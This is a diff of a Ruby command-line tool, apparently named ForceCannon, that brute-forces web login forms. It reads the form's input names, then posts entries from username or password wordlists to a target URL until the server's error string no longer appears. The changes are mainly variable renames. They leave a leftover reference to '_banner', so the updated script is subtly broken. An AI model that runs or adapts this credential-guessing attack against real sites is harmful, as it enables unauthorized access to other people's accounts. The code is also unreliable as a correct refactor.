@@ -77,15 +77,15 @@ class ForceCannon
 
     def operating_modes(response)
 
-        _inputs_names = []
-        _banner = File.read("logo_cannon.txt")
+        inputs_names = []
+        banner = File.read("logo_cannon.txt")
         puts _banner
 
         if response.to_i == 1
 
-            _parsed_data = Nokogiri::HTML.parse(URI.open(@options[:target])) 
+            parsed_data = Nokogiri::HTML.parse(URI.open(@options[:target])) 
 
-            test = _parsed_data.css('form[method=post]')[0].css('input').select{|types| types['type'] == "text" || types['type'] == "password"}
+            test = parsed_data.css('form[method=post]')[0].css('input').select{|types| types['type'] == "text" || types['type'] == "password"}
             test.each{|names| inputs_names.push(names.attributes['name'])}
 
         elsif response.to_i == 2
@@ -93,11 +93,11 @@ class ForceCannon
             puts "===" * 20
             print "[?] Name attribute (Username): "
 
-            _inputs_names[0] = $stdin.gets.chomp
+            inputs_names[0] = $stdin.gets.chomp
             puts "===" * 20
             print "[?] Name attribute (Password): "
 
-            _inputs_names[1] = $stdin.gets.chomp
+            inputs_names[1] = $stdin.gets.chomp
             puts "===" * 20 + "\n\n"
 
         else
@@ -106,11 +106,11 @@ class ForceCannon
             puts "===" * 20
             print "[?] Name attribute (Username): "
 
-            _inputs_names[0] = $stdin.gets.chomp
+            inputs_names[0] = $stdin.gets.chomp
             puts "===" * 20
             print "[?] Name attribute (Password): "
 
-            _inputs_names[1] = $stdin.gets.chomp
+            inputs_names[1] = $stdin.gets.chomp
             puts "===" * 20 + "\n\n"
 
         end
@@ -122,12 +122,14 @@ class ForceCannon
     def bruteforce_HTTP_POST
 
         print "\n[!] Select an operating mode\n\n"
-        print "1 - Automatic Mode ---> This will pass the values of the ['name'] attributes of the HTML form automatically (Not 100% reliable)\n"
-        print "2 - Manual Mode ---> Manually enter the values of the ['name'] attributes of the HTML form (100% reliable)\n\n"
+        print "1 - Automatic Mode ---> Automatically enters the values of the ['name'] attributes"
+        puts "\n(Not 100% reliable)\n"
+        print "\n2 - Manual Mode ---> Manually enter the values of the ['name'] attributes"
+        puts "\n(100% reliable)\n\n"
         print "Mode => "
-        _response = $stdin.gets.chomp
+        response = $stdin.gets.chomp
         
-        operating_modes(_response)
+        operating_modes(response)
 
         puts "---" * 15
         puts "[?] Initializing BruteForce Attack\n"
@@ -137,21 +139,21 @@ class ForceCannon
         puts "[!] Attacking..."
         puts "---" * 15
 
-        _url = URI(@options[:target])
-        _status = Net::HTTP.get_response(url)
+        url = URI(@options[:target])
+        status = Net::HTTP.get_response(url)
 
-        if _status.code.to_i == 200 || _status.code.to_i == 302
+        if status.code.to_i == 200 || status.code.to_i == 302
             if @options[:usersList].nil? && !@options[:passList].empty?
 
                 File.open(@options[:passList], "r") do |list|
                     list.each_line do |line|
-                        _parameters = {
+                        parameters = {
                             @user_data => @options[:username],
                             @pass_data => line.chomp
                         }
                             
-                        _request = Net::HTTP.post_form(_url, _parameters)      
-                        if _request.body.include?(@options[:error])
+                        request = Net::HTTP.post_form(url, parameters)      
+                        if request.body.include?(@options[:error])
                             puts "\n[+] Testing with #{@options[:username]} | #{line.chomp}"
                             
                         else
@@ -165,13 +167,13 @@ class ForceCannon
             else
                 File.open(@options[:usersList], "r") do |list|
                     list.each_line do |line|
-                        _parameters = {
+                        parameters = {
                             @user_data => line.chomp,
                             @pass_data => @options[:password]
                         }
                         
-                        _request = Net::HTTP.post_form(_url, _parameters)
-                        if _request.body.include?(@options[:error])
+                        request = Net::HTTP.post_form(url, parameters)
+                        if request.body.include?(@options[:error])
                             puts "\n[+] Testing with #{line.chomp} | #{@options[:password]}"
 
                         else
@@ -189,6 +191,6 @@ class ForceCannon
     end
 end
 
-$force_cannon = ForceCannon.new
-$options = force_cannon.parse_options
-$force_cannon.bruteforce_HTTP_POST
+force_cannon = ForceCannon.new
+options = force_cannon.parse_options
+force_cannon.bruteforce_HTTP_POST
